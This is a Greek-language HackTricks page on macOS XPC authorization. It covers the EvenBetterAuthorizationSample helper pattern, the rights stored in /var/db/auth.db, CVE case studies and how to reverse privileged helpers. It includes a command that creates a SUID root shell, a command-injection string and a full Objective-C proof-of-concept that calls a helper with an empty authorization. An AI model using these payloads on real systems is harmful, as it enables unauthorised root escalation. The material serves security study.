# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Η Apple παρέχει επίσης έναν άλλο τρόπο για να επαληθεύει αν η συνδεόμενη διεργασία έχει **άδεια να καλέσει μια εκτεθειμένη μέθοδο XPC**.<sup>[[2]](#references)</sup>

Όταν μια εφαρμογή χρειάζεται να **εκτελεί ενέργειες ως προνομιούχος χρήστης**, αντί να εκτελείται η ίδια ως προνομιούχος χρήστης, συνήθως εγκαθιστά ως root ένα HelperTool ως υπηρεσία XPC, η οποία μπορεί να καλείται από την εφαρμογή για την εκτέλεση αυτών των ενεργειών. Ωστόσο, η εφαρμογή που καλεί την υπηρεσία θα πρέπει να διαθέτει επαρκή authorization.

### ShouldAcceptNewConnection always YES

Ένα παράδειγμα μπορεί να βρεθεί στο [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Στο `App/AppDelegate.m` προσπαθεί να **συνδεθεί** στο **HelperTool**. Και στο `HelperTool/HelperTool.m`, η συνάρτηση **`shouldAcceptNewConnection`** **δεν θα ελέγξει** καμία από τις απαιτήσεις που αναφέρθηκαν προηγουμένως. Θα επιστρέφει πάντα YES:<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Για περισσότερες πληροφορίες σχετικά με τη σωστή ρύθμιση αυτού του check:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Δικαιώματα εφαρμογής

Ωστόσο, υπάρχει κάποια **εξουσιοδότηση που πραγματοποιείται όταν καλείται μια μέθοδος από το HelperTool**.

Η συνάρτηση **`applicationDidFinishLaunching`** από το `App/AppDelegate.m` θα δημιουργήσει μια κενή αναφορά εξουσιοδότησης αφού ξεκινήσει η εφαρμογή. Αυτό θα πρέπει να λειτουργεί πάντα.\
Στη συνέχεια, θα προσπαθήσει να **προσθέσει κάποια δικαιώματα** σε αυτή την αναφορά εξουσιοδότησης καλώντας τη `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Η συνάρτηση `setupAuthorizationRights` από το `Common/Common.m` θα αποθηκεύσει στη βάση δεδομένων auth `/var/db/auth.db` τα δικαιώματα της εφαρμογής. Παρατηρήστε ότι θα προσθέσει μόνο τα δικαιώματα που δεν υπάρχουν ήδη στη βάση δεδομένων:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Η συνάρτηση `enumerateRightsUsingBlock` χρησιμοποιείται για τη λήψη των δικαιωμάτων των εφαρμογών, τα οποία ορίζονται στο `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Αυτό σημαίνει ότι στο τέλος αυτής της διαδικασίας, τα δικαιώματα που δηλώνονται μέσα στο `commandInfo` θα αποθηκευτούν στο `/var/db/auth.db`. Για **κάθε μέθοδο** που θα **απαιτεί authentication**, η βάση δεδομένων περιέχει το **όνομα του permission** και το **`kCommandKeyAuthRightDefault`**. Το τελευταίο **υποδεικνύει ποιος μπορεί να αποκτήσει αυτό το δικαίωμα**.<sup>[[1]](#references)</sup>

Υπάρχουν διαφορετικά scopes που υποδεικνύουν ποιος μπορεί να έχει πρόσβαση σε ένα δικαίωμα. Ορισμένα από αυτά ορίζονται στο [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (μπορείτε να βρείτε [όλα εδώ](https://www.dssw.co.uk/reference/authorization-rights/)), αλλά συνοπτικά:<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">Όνομα</th><th width="165">Τιμή</th><th>Περιγραφή</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Οποιοσδήποτε</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Κανείς</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Ο τρέχων χρήστης πρέπει να είναι admin (μέλος της ομάδας admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Ζητείται από τον χρήστη να πραγματοποιήσει authentication.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Ζητείται από τον χρήστη να πραγματοποιήσει authentication. Πρέπει να είναι admin (μέλος της ομάδας admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Καθορισμός rules</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Καθορισμός επιπλέον σχολίων για το δικαίωμα</td></tr></tbody></table>

### Επαλήθευση δικαιωμάτων

Στο `HelperTool/HelperTool.m`, η συνάρτηση **`readLicenseKeyAuthorization`** ελέγχει αν ο caller είναι εξουσιοδοτημένος να **εκτελέσει μια τέτοια μέθοδο**, καλώντας τη συνάρτηση **`checkAuthorization`**. Αυτή η συνάρτηση ελέγχει αν τα **authData** που αποστέλλονται από τη calling process έχουν **σωστή μορφή** και στη συνέχεια ελέγχει **τι απαιτείται για την απόκτηση του δικαιώματος** κλήσης της συγκεκριμένης μεθόδου. Αν όλα πάνε καλά, το **επιστρεφόμενο `error` θα είναι `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Για να **ελέγξει τις απαιτήσεις για την απόκτηση του κατάλληλου** δικαιώματος κλήσης αυτής της μεθόδου, η `authorizationRightForCommand` ελέγχει το προαναφερθέν αντικείμενο **`commandInfo`**. Στη συνέχεια καλεί την **`AuthorizationCopyRights`** για να ελέγξει **αν ο caller διαθέτει τα δικαιώματα** για την κλήση της function (σημειώστε ότι τα flags επιτρέπουν την αλληλεπίδραση με τον χρήστη).<sup>[[1]](#references)[[3]](#references)</sup>

Σε αυτή την περίπτωση, για την κλήση της function `readLicenseKeyAuthorization`, το `kCommandKeyAuthRightDefault` ορίζεται σε `@kAuthorizationRuleClassAllow`. Επομένως, **οποιοσδήποτε μπορεί να την καλέσει**.

### Πληροφορίες DB

Αναφέρθηκε ότι αυτές οι πληροφορίες αποθηκεύονται στο `/var/db/auth.db`. Μπορείτε να εμφανίσετε όλους τους αποθηκευμένους κανόνες με:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Στη συνέχεια, μπορείτε να δείτε ποιος μπορεί να αποκτήσει πρόσβαση στο συγκεκριμένο δικαίωμα με:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive rights

Μπορείτε να βρείτε **όλες τις διαμορφώσεις δικαιωμάτων** [**εδώ**](https://www.dssw.co.uk/reference/authorization-rights/), αλλά οι συνδυασμοί που δεν θα απαιτούν αλληλεπίδραση με τον χρήστη είναι οι εξής:<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
- Αυτό είναι το πιο άμεσο key. Αν οριστεί σε `false`, καθορίζει ότι ο χρήστης δεν χρειάζεται να παρέχει authentication για να αποκτήσει αυτό το right.
- Χρησιμοποιείται σε **συνδυασμό με ένα από τα 2 παρακάτω ή με τον καθορισμό ενός group** στον οποίο πρέπει να ανήκει ο χρήστης.
2. **'allow-root': 'true'**
- Αν ένας χρήστης λειτουργεί ως root user (ο οποίος διαθέτει αυξημένα permissions) και αυτό το key έχει οριστεί σε `true`, ο root user θα μπορούσε ενδεχομένως να αποκτήσει αυτό το right χωρίς περαιτέρω authentication. Ωστόσο, συνήθως, η απόκτηση status root user απαιτεί ήδη authentication, επομένως αυτό δεν αποτελεί σενάριο «χωρίς authentication» για τους περισσότερους χρήστες.
3. **'session-owner': 'true'**
- Αν οριστεί σε `true`, ο owner της session (ο χρήστης που είναι επί του παρόντος logged in) θα αποκτήσει αυτόματα αυτό το right. Αυτό μπορεί να παρακάμπτει το πρόσθετο authentication αν ο χρήστης είναι ήδη logged in.
4. **'shared': 'true'**
- Αυτό το key δεν παρέχει rights χωρίς authentication. Αντίθετα, αν οριστεί σε `true`, σημαίνει ότι μόλις γίνει authentication για το right, αυτό μπορεί να μοιραστεί μεταξύ πολλαπλών processes χωρίς να χρειάζεται κάθε process να κάνει ξανά authentication. Ωστόσο, η αρχική παραχώρηση του right θα εξακολουθεί να απαιτεί authentication, εκτός αν συνδυαστεί με άλλα keys όπως το `'authenticate-user': 'false'`.

Μπορείτε να [**χρησιμοποιήσετε αυτό το script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) για να λάβετε τα ενδιαφέροντα rights:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Μελέτες περίπτωσης παράκαμψης Authorization

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Η privileged Mach service `com.acustica.HelperTool` αποδέχεται κάθε connection και η ρουτίνα `checkAuthorization:` καλεί τη `AuthorizationCopyRights(NULL, …)`, επομένως οποιοδήποτε blob 32 byte γίνεται αποδεκτό. Στη συνέχεια, η `executeCommand:authorization:withReply:` διοχετεύει strings διαχωρισμένα με κόμμα και ελεγχόμενα από τον attacker στο `NSTask` ως root, καθιστώντας payloads όπως τα εξής:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trivially create a SUID root shell. Λεπτομέρειες σε [αυτό το write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Ο listener επιστρέφει πάντα YES και το ίδιο μοτίβο NULL `AuthorizationCopyRights` εμφανίζεται στη `checkAuthorization:`. Η μέθοδος `exchangeAppWithReply:` συνενώνει input του attacker σε ένα string `system()` δύο φορές, επομένως η εισαγωγή shell metacharacters στο `appPath` (π.χ. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) επιτρέπει root code execution μέσω του Mach service `com.plugin-alliance.pa-installationhelper`. Περισσότερες πληροφορίες [εδώ](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Η εκτέλεση ενός audit δημιουργεί το `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, εκθέτει το Mach service `com.jamf.complianceeditor.helper` και εξάγει το `-executeScriptAt:arguments:then:` χωρίς να επαληθεύει το `AuthorizationExternalForm` ή το code signature του caller. Ένα trivial exploit δημιουργεί ένα κενό reference με `AuthorizationCreate`, συνδέεται με `[[NSXPCConnection alloc] initWithMachServiceName:NSXPCConnectionPrivileged]` και καλεί τη μέθοδο για την εκτέλεση arbitrary binaries ως root. Πλήρεις σημειώσεις reversing (μαζί με PoC) στο [write-up του Mykola Grymalyuk](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: Τα FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 και 7.4.0–7.4.2 αποδέχονταν crafted XPC messages που έφταναν σε privileged helper χωρίς authorization gates. Επειδή ο helper εμπιστευόταν το δικό του privileged `AuthorizationRef`, οποιοσδήποτε local user μπορούσε να στείλει messages στο service και να το εξαναγκάσει να εκτελέσει arbitrary configuration changes ή commands ως root. Λεπτομέρειες στο [advisory summary της SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[[5]](#references)</sup>

#### Συμβουλές για rapid triage

- Όταν ένα app παρέχει τόσο GUI όσο και helper, συγκρίνετε τις code requirements τους και ελέγξτε αν το `shouldAcceptNewConnection` κλειδώνει τον listener με `-setCodeSigningRequirement:` (ή επαληθεύει το `SecCodeCopySigningInformation`). Οι ελλείποντες έλεγχοι συνήθως οδηγούν σε σενάρια CWE-863, όπως στην περίπτωση του Jamf. Μια γρήγορη ματιά μοιάζει με:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Συγκρίνετε τι *θεωρεί* ότι εξουσιοδοτεί το helper με αυτό που παρέχει ο client. Κατά το reversing, βάλτε breakpoint στο `AuthorizationCopyRights` και επιβεβαιώστε ότι το `AuthorizationRef` προέρχεται από το `AuthorizationCreateFromExternalForm` (παρέχεται από τον client) και όχι από το δικό του privileged context του helper· διαφορετικά πιθανότατα εντοπίσατε ένα μοτίβο CWE-863 παρόμοιο με τις παραπάνω περιπτώσεις.

## Reversing Authorization

### Έλεγχος αν χρησιμοποιείται το EvenBetterAuthorization

Αν εντοπίσετε τη συνάρτηση: **`[HelperTool checkAuthorization:command:]`**, πιθανότατα η διεργασία χρησιμοποιεί το σχήμα εξουσιοδότησης που αναφέρθηκε προηγουμένως:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Αν αυτή η συνάρτηση καλεί APIs όπως τα `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights` και `AuthorizationFree`, χρησιμοποιεί το μοτίβο [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Ελέγξτε το **`/var/db/auth.db`** για να δείτε αν είναι δυνατό να αποκτήσετε δικαιώματα για την κλήση κάποιας privileged ενέργειας χωρίς αλληλεπίδραση με τον χρήστη.

### Επικοινωνία Protocol

Στη συνέχεια, πρέπει να εντοπίσετε το protocol schema, ώστε να μπορέσετε να δημιουργήσετε επικοινωνία με την XPC service.

Η συνάρτηση **`shouldAcceptNewConnection`** υποδεικνύει το protocol που εξάγεται:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Σε αυτή την περίπτωση, έχουμε το ίδιο με το EvenBetterAuthorizationSample· [**ελέγξτε αυτή τη γραμμή**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Γνωρίζοντας το όνομα του protocol που χρησιμοποιείται, είναι δυνατό να κάνετε **dump του ορισμού του header** με:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Τέλος, χρειάζεται απλώς να γνωρίζουμε το **όνομα του εκτεθειμένου Mach Service**, ώστε να μπορέσουμε να επικοινωνήσουμε μαζί του. Υπάρχουν διάφοροι τρόποι για να το βρούμε:

- Στο **`[HelperTool init]`**, όπου μπορείτε να δείτε το Mach Service που χρησιμοποιείται:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Στο launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Παράδειγμα Exploit

Σε αυτό το παράδειγμα δημιουργούνται:

- Ο ορισμός του protocol με τις functions
- Ένα κενό auth για την υποβολή αιτήματος πρόσβασης
- Μια σύνδεση με το XPC service
- Μια κλήση στη function, εάν η σύνδεση ήταν επιτυχής
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Άλλοι XPC privilege helpers που έγιναν αντικείμενο abuse

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## References

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Υπηρεσίες Authorization](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Κλιμάκωση προνομίων στο Jamf Compliance Editor](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: Ευπάθεια κλιμάκωσης προνομίων στο FortiClient Mac](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Τοπική κλιμάκωση προνομίων στην υπηρεσία Acustica Audio HelperTool XPC στο Aquarius Desktop για macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Τοπική κλιμάκωση προνομίων στην υπηρεσία Plugin Alliance InstallationHelper XPC](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Κλιμάκωση προνομίων στο Apple EndpointSecurity framework (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Apple Open Source — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Αναφορά δικαιωμάτων Authorization (dssw.co.uk)](https://www.dssw.co.uk/reference/authorization-rights/)
{{#include ../../../../../banners/hacktricks-training.md}}
